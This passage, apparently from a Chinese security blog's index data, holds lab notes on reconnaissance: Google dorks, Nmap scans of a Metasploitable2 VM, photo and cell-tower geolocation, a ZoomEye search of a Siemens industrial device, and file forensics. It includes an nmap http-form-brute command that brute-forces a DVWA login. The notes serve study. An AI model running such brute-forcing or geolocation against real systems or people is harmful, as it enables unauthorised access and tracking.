（4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。","text":"[toc] 0x01网络扫描与网络侦查的目的 黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； （4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。 0x02 常用工具介绍 ¶1x01 Google Hack Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。 我在以前写过一篇Goolge Hack基本语法的介绍博客。 链接如下：【白帽子学习笔记10】Google语法 ¶1x02 Nmap Nmap是一个网络侦察和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取哪台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口映射)，碎片扫描，以及灵活的目标和端口设定。 Nmap运行通常会得到被扫描主机端口的列表。Nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止Nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙/包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。 根据使用的功能选项，Nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。 ¶1x03 Winhex WinHex 是一款以通用的 16 进制编辑器为核心，专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具： 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等。 ¶1x04 Metasploit Metasploit是一个渗透测试框架，里面集合了很多的渗透测试功能。我关于Metasploit也写过一篇博客，链接如下： 白帽子学习笔记18】Metasploit学习笔记 0x03 被动扫描 ¶1x01 麻省理工学院网站中文件名包含“network security”的pdf文档 首先我们先来构造一下谷歌语法： inurl:mit.edu intext:network security filetype:pdf inurl:mit.edu 表示搜索结果的url中包含mit.edu intext:network security 表示搜索的结果中包括network security filetype:pdf 表示搜索结果中的文件类型为pdf ¶1x02 照片信息解析 根据一张照片找出这个女孩在哪里旅行。 首先先看照片中的文字，然后可以看到一些文字，尝试将这些内容在Google 地图中进行搜索。 但是仔细一看发现不太对劲。这个图片不太一样啊。 最后尝试改变一下时间轴找到了在2015年时候的装潢是和图片中一样的。 这个是位置信息。 ¶1x03 手机位置定位 手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。 获取自己手机的LAC和CID： Android 获取方法：Android： 拨号*#*#4636#*#*进入手机信息工程模式后查看 iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest 但是请注意，这个操作在很多品牌的新版本中已经不能用了，比如华为和OPPO等。 ¶1x04 编码解码 将Z29vZCBnb29kIHN0dWR5IQ==解码 很明显的Base64解码 ¶1x05 地址信息 通过随便一个MAC地址查询网站就可以确定此MAC地址为苹果品牌 之后需要确定202.193.64.34到底是那个网页，发现直接访问不行。所以查询一下这个IP地址。 嗯于是就是猜测这个会不会不是桂电的官网呢？ 我们去ping一下桂电的官网，发现果然如此。 得出结论，这是一个苹果设备访问了桂电的主页。 首先我的IP地址是113.13.35.21 但是通过ifconfig查询到到本机ip地址为： 10.33.17.179 这两个都是我的IP地址，为什么会不一样呢？ 因为10.33.17.179是我的内网网址，而当我访问https://whatismyipaddress.com的时候，这个网址的主机是在外网的，我的数据包需要经过路由器将信息传输到外网当中，所以这个网页中获取的就是经过路由器转换后的外网地址。 0x04 NMAP扫描Metasploitable2漏洞 ¶1x01 NMAP扫描Metasploitable2端口开放情况 首先我们需要两个虚拟机设备，并让两台设备置于同一网段 可以看到两者位于同一网段，我这里是两台设备同时设置在了虚拟机到Net模式下。 下面使用Nmap进行扫描。 可以看到开放了那么多的端口，不同的端口分别对于不同服务。 端口号 服务 ftp 远程文件传输 ssh 远程连接 telnet 远程登陆协议 smtp 提供可靠且有效的电子邮件传输协议 domain 将域名和IP地址相互映射 http 超文本传输协议 rpcbind rpcbind与BIND或实际上与任何DNS服务器非常相似。当使用将RPC接口的声明编译为服务器和客户端存根代码时，会选择或获得一个协议号rpcgen。 netbios-ssn 面向连接通信提供会话服务 microsoft-ds 远程登陆端口 exec exec函数族的函数执行成功后不会返回 login 登陆 shell Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务 rmiregistry 用于不同虚拟机之间的通信 ingreslock Ingreslock后门程序监听在1524端口，连接到1524端口就可以直接获得root权限 nfs 通过网络，让不同的机器、不同的操作系统可以共享彼此的文件 ccproxy-ftp 主要用于局域网内共享宽带上网，ADSL共享上网、专线代理共享、ISDN代理共享、卫星代理共享、蓝牙代理共享和二级代理等的文件传输 mysql 数据库 postgresql 关系数据库服务器 vnc 远程连接（有GUI图像界面） X11 X11也叫做X Window系统，X Window系统 (X11或X)是一种 位图 显示的 视窗系统 irc 一种网络聊天协议 ajp13 定向包协议 ¶1x02 NMAP扫描Metasploitable2操作系统类型 使用 nmap -O IP即可扫描操作系统信息。扫描结果如下图 ¶1x03 NMAP穷举Metasploitable2上DVWA的登陆账号和密码 通过扫描我们可以知道Metasploitable2开放了80的端口，DVWA是网页服务器而且上面也没有开启443端口所有就肯定在80端口了。 接下来选择nmap自带的http暴力破解工具 http-form-brute 选择路径为：/dvwa/login.php 组成的命令为： nmap -p 80 -script=http-form-brute -script-args=http-form-brute.path=/dvwa/login.php 10.34.80.4 ¶1x04 永恒之蓝-WannaCry蠕虫 WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件。蠕虫病毒是一种常见的计算机病毒，是无须计算机使用者干预即可运行的独立程序，它通过不停的获得网络中存在漏洞的计算机上的部分或全部控制权来进行传播。此病毒通过远程高危漏洞进行自我传播复制,并且加密文件采用了高强度的双RSA+AES加密,至少目前来说破解秘钥是不可能的,只能通过预防的方式来防御,勤打补丁,关闭445、139等端口,及时安装安全软件。 0x05 ZoomEye搜索一个西门子工控设备 在ZoomEye中搜索西门子工控设备，点击一个可以看到该IP设备的如下信息 该设备开启了FTP端口可能会面临被不法分子获取FTP远程连接密码导致重要文件泄漏的问题，也开放了80和443端口说明可能有Web端，Web端的漏洞也可能导致系统遭到攻击。 0x06 数据恢复与取证 ¶1x01 修复elephant.jpg 用16进制编辑器打开后可以发现文件头明显不符合JPG的格式。手动给改回来。 JPG文件头： FF D8 FF E0 成功修复 ¶1x02 笑脸后的阴霾 用16进制查看器拿到最后可以发现：tom is the killer. 太可怕了～～ ¶1x04 使用数据恢复软件恢复U盘文件 目前网络中的U盘数据工具很多，我使用了一个叫做嗨格式的U盘恢复软件，效果还挺不错的，操作也很简单。 0x07 小结 通过对本篇博文的总结我们可以学习到如下内容： Google语法在信息搜索中的应用 图像信息提取能力 Nmap常用操作 Winhex等16进制软件的使用（文件修复，查看隐藏信息） 通过这些内容我们可以对网络扫描和网络侦查有一个很好的了解。","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]}],"categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"},{"name":"CV","slug":"CV","permalink":"http://example.com/categories/CV/"}],"tags":[{"name":"神经对抗攻击","slug":"神经对抗攻击","permalink":"http://example.com/tags/%E7%A5%9E%E7%BB%8F%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"},{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"},{"name":"CV","slug":"CV","permalink":"http://example.com/tags/CV/"}]}